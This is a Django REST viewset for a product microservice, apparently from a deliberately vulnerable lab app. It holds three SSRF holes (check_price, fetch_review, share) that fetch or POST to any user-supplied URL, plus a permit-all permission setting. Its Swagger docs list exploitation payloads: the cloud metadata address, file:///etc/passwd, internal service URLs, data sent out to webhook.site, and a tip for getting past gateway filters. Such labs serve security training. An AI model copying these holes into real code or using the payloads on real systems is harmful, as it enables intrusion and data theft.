from rest_framework import viewsets, status
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework.permissions import AllowAny
from drf_yasg.utils import swagger_auto_schema
from drf_yasg import openapi
import requests
import re
from urllib.parse import urlparse
from .models import Product, ProductSize
from .serializers import ProductSerializer, ProductCreateSerializer, ProductSizeSerializer


class ProductViewSet(viewsets.ModelViewSet):
    queryset = Product.objects.all()
    permission_classes = [AllowAny]  # Allow all operations for testing
    
    def get_serializer_class(self):
        if self.action in ['create', 'update', 'partial_update']:
            return ProductCreateSerializer
        return ProductSerializer
    
    def retrieve(self, request, *args, **kwargs):
        """
        IMPROVED: Get product detail with real-time inventory from inventory-service
        """
        product = self.get_object()
        serializer = self.get_serializer(product)
        product_data = serializer.data
        
        # 🔥 INTER-SERVICE CALL: Get inventory from inventory-service
        try:
            print(f"[PRODUCT_DETAIL] Calling inventory-service for product {product.id}")
            inventory_response = requests.get(
                f'http://inventory-service:8083/api/inventory/{product.id}',
                timeout=3
            )
            
            if inventory_response.ok:
                inventory_data = inventory_response.json()
                product_data['inventory'] = inventory_data.get('inventory', {})
                product_data['inventory_status'] = 'available'
                print(f"[PRODUCT_DETAIL] Got inventory: {inventory_data}")
            else:
                product_data['inventory'] = {}
                product_data['inventory_status'] = 'unavailable'
                print(f"[PRODUCT_DETAIL] Inventory service returned {inventory_response.status_code}")
                
        except Exception as e:
            print(f"[PRODUCT_DETAIL] Error calling inventory-service: {str(e)}")
            product_data['inventory'] = {}
            product_data['inventory_status'] = 'error'
        
        return Response(product_data)

    @action(detail=True, methods=['get'])
    def sizes(self, request, pk=None):
        """Get all sizes for a product"""
        product = self.get_object()
        sizes = product.sizes.all()
        serializer = ProductSizeSerializer(sizes, many=True)
        return Response(serializer.data)

    @action(detail=True, methods=['post'])
    def add_size(self, request, pk=None):
        """Add a size to a product"""
        product = self.get_object()
        serializer = ProductSizeSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save(product=product)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    @swagger_auto_schema(
        method='get',
        operation_description="""
        **🚨 SSRF VULNERABILITY - Price Comparison Feature**
        
        This endpoint fetches prices from external websites for comparison.
        **VULNERABLE:** Server makes HTTP request to user-provided URL without validation.
        
        **Exploitation Examples:**
        - Internal services: `?compare_url=http://user-service:8081/api/users`
        - Localhost: `?compare_url=http://127.0.0.1:8081`
        - Private IPs: `?compare_url=http://192.168.1.1`
        - Metadata: `?compare_url=http://169.254.169.254/latest/meta-data/`
        
        **Note:** API Gateway may block some patterns in query parameters.
        Try POST body instead: `{"compare_url": "http://internal-service"}`
        """,
        manual_parameters=[
            openapi.Parameter(
                'compare_url',
                openapi.IN_QUERY,
                description="URL of website to compare prices (⚠️ VULNERABLE - accepts any URL)",
                type=openapi.TYPE_STRING,
                required=True,
                example="http://localhost:8081/api/users"
            )
        ],
        responses={
            200: openapi.Response(
                description="Price comparison result with fetched content",
                examples={
                    "application/json": {
                        "product_name": "Sample Product",
                        "compare_url": "http://example.com",
                        "status_code": 200,
                        "found_prices": ["$99", "$149"],
                        "content_preview": "HTML content from fetched URL..."
                    }
                }
            ),
            400: "Invalid or unreachable URL"
        },
        tags=['SSRF Vulnerable']
    )
    @swagger_auto_schema(
        method='post',
        operation_description="**POST version** - May bypass API Gateway filters that only check query parameters",
        request_body=openapi.Schema(
            type=openapi.TYPE_OBJECT,
            required=['compare_url'],
            properties={
                'compare_url': openapi.Schema(
                    type=openapi.TYPE_STRING,
                    description="Target URL (⚠️ VULNERABLE)",
                    example="http://user-service:8081/api/users"
                )
            }
        ),
        tags=['SSRF Vulnerable']
    )
    @action(detail=True, methods=['get', 'post'])
    def check_price(self, request, pk=None):
        """
        SSRF VULNERABILITY: So sánh giá từ website khác
        User nhập URL website → Server fetch để lấy giá → SSRF!
        
        REALISTIC: Accept both GET and POST để dễ test
        - GET: /api/products/5/check_price/?compare_url=http://example.com
        - POST: /api/products/5/check_price/ với JSON body
        """
        product = self.get_object()
        
        # Accept parameter từ GET query hoặc POST body
        compare_url = request.query_params.get('compare_url') or request.data.get('compare_url')
        
        if not compare_url:
            return Response({'error': 'compare_url is required'}, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            print(f"[PRICE_CHECK] Fetching price from: {compare_url}")
            
            # VULNERABLE: No URL validation, allows internal network access
            response = requests.get(compare_url, timeout=10, headers={
                'User-Agent': 'ShopBot/1.0 Price Checker'
            })
            
            # Try to extract price from HTML (simple regex)
            content = response.text[:2000]  # Limit content for demo
            
            # Look for price patterns
            price_patterns = [
                r'[\$₫][\d,]+',
                r'price["\s:]*[\$₫]?[\d,]+',
                r'giá["\s:]*[\$₫]?[\d,]+',
            ]
            
            found_prices = []
            for pattern in price_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                found_prices.extend(matches)
            
            result = {
                'product_name': product.name,
                'compare_url': compare_url,
                'status_code': response.status_code,
                'found_prices': found_prices[:5],  # Limit results
                'message': f'Tìm thấy {len(found_prices)} giá từ website này',
                'content_preview': content[:300] + '...' if len(content) > 300 else content
            }
            
            print(f"[PRICE_CHECK] Result: {result}")
            
            return Response(result)
            
        except Exception as e:
            return Response({
                'error': f'Không thể truy cập website: {str(e)}',
                'compare_url': compare_url
            }, status=status.HTTP_400_BAD_REQUEST)

    @swagger_auto_schema(
        method='get',
        operation_description="""
        **🚨 SSRF VULNERABILITY - Review Fetcher**
        
        Fetches product reviews from external blogs/websites.
        **VULNERABLE:** Server fetches full HTML content from user-provided URL.
        
        **Exploitation:**
        - Exfiltrate internal data: `?review_url=http://user-service:8081/actuator/env`
        - Read local files: `?review_url=file:///etc/passwd` (if file:// allowed)
        - Blind SSRF: Use webhook.site to confirm server-side requests
        """,
        manual_parameters=[
            openapi.Parameter(
                'review_url',
                openapi.IN_QUERY,
                description="URL of review page (⚠️ VULNERABLE)",
                type=openapi.TYPE_STRING,
                required=True,
                example="http://product-service:8082/admin/"
            )
        ],
        tags=['SSRF Vulnerable']
    )
    @swagger_auto_schema(
        method='post',
        request_body=openapi.Schema(
            type=openapi.TYPE_OBJECT,
            required=['review_url'],
            properties={
                'review_url': openapi.Schema(
                    type=openapi.TYPE_STRING,
                    example="http://localhost:8081"
                )
            }
        ),
        tags=['SSRF Vulnerable']
    )
    @action(detail=True, methods=['get', 'post'])
    def fetch_review(self, request, pk=None):
        """
        SSRF VULNERABILITY: Lấy review từ blog/website
        User nhập URL review → Server fetch content → SSRF!
        
        REALISTIC: Accept both GET and POST
        - GET: /api/products/5/fetch_review/?review_url=http://blog.com/review
        - POST: /api/products/5/fetch_review/ với JSON body
        """
        product = self.get_object()
        
        # Accept parameter từ GET query hoặc POST body
        review_url = request.query_params.get('review_url') or request.data.get('review_url')
        
        if not review_url:
            return Response({'error': 'review_url is required'}, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            print(f"[REVIEW_FETCH] Fetching review from: {review_url}")
            
            # VULNERABLE: No URL validation
            response = requests.get(review_url, timeout=10, headers={
                'User-Agent': 'ReviewBot/1.0 Content Fetcher'
            })
            
            content = response.text[:3000]  # Limit for demo
            
            # Simple content extraction
            review_keywords = ['review', 'đánh giá', 'tốt', 'xấu', 'chất lượng', 'tuyệt vời', 'terrible', 'good', 'bad']
            found_keywords = []
            
            for keyword in review_keywords:
                if keyword.lower() in content.lower():
                    found_keywords.append(keyword)
            
            # Extract title
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
            title = title_match.group(1) if title_match else 'Không tìm thấy tiêu đề'
            
            result = {
                'product_name': product.name,
                'review_url': review_url,
                'status_code': response.status_code,
                'page_title': title,
                'found_keywords': found_keywords,
                'summary': f'Tìm thấy {len(found_keywords)} từ khóa review liên quan',
                'content_preview': content[:500] + '...' if len(content) > 500 else content
            }
            
            print(f"[REVIEW_FETCH] Result: {result}")
            
            return Response(result)
            
        except Exception as e:
            return Response({
                'error': f'Không thể lấy review: {str(e)}',
                'review_url': review_url
            }, status=status.HTTP_400_BAD_REQUEST)

    @swagger_auto_schema(
        method='get',
        operation_description="""
        **🚨 SSRF VULNERABILITY - Social Media Sharing (POST Request)**
        
        POSTs product information to social media APIs.
        **VULNERABLE:** Server makes POST request to user-controlled URL.
        
        **Exploitation:**
        - Send data to attacker server: `?share_api_url=https://webhook.site/your-id`
        - Trigger internal webhooks: `?share_api_url=http://internal-webhook:8080/trigger`
        - Attack internal services with POST data
        
        **Unique:** This is SSRF with POST method, not just GET!
        """,
        manual_parameters=[
            openapi.Parameter(
                'share_api_url',
                openapi.IN_QUERY,
                description="Social media API endpoint (⚠️ VULNERABLE - accepts any URL)",
                type=openapi.TYPE_STRING,
                required=True,
                example="https://webhook.site/unique-id"
            )
        ],
        tags=['SSRF Vulnerable']
    )
    @swagger_auto_schema(
        method='post',
        request_body=openapi.Schema(
            type=openapi.TYPE_OBJECT,
            required=['share_api_url'],
            properties={
                'share_api_url': openapi.Schema(
                    type=openapi.TYPE_STRING,
                    example="http://internal-service:8080/webhook"
                )
            }
        ),
        tags=['SSRF Vulnerable']
    )
    @action(detail=True, methods=['get', 'post'])
    def share(self, request, pk=None):
        """
        SSRF VULNERABILITY: Chia sẻ lên mạng xã hội
        User nhập API URL → Server gửi POST request → SSRF!
        
        REALISTIC: Accept both GET and POST
        - GET: /api/products/5/share/?share_api_url=http://social.com/api/post
        - POST: /api/products/5/share/ với JSON body
        """
        product = self.get_object()
        
        # Accept parameter từ GET query hoặc POST body
        share_api_url = request.query_params.get('share_api_url') or request.data.get('share_api_url')
        
        if not share_api_url:
            return Response({'error': 'share_api_url is required'}, status=status.HTTP_400_BAD_REQUEST)
        
        try:
            print(f"[SHARE] Sharing product to: {share_api_url}")
            
            # Prepare sharing data
            share_data = {
                'title': f'Sản phẩm: {product.name}',
                'description': product.description[:200],
                'price': f'{product.price} VND',
                'image_url': product.image_url,
                'product_url': f'http://localhost:8080/products/{product.id}'
            }
            
            # VULNERABLE: No URL validation, POST to any URL
            response = requests.post(share_api_url, json=share_data, timeout=10, headers={
                'Content-Type': 'application/json',
                'User-Agent': 'ShareBot/1.0 Social Media Poster'
            })
            
            result = {
                'product_name': product.name,
                'share_api_url': share_api_url,
                'status_code': response.status_code,
                'message': 'Chia sẻ thành công!' if response.status_code < 400 else 'Chia sẻ thất bại',
                'response_preview': response.text[:300] if response.text else 'No response body'
            }
            
            print(f"[SHARE] Result: {result}")
            
            return Response(result)
            
        except Exception as e:
            return Response({
                'error': f'Không thể chia sẻ: {str(e)}',
                'share_api_url': share_api_url
            }, status=status.HTTP_400_BAD_REQUEST)
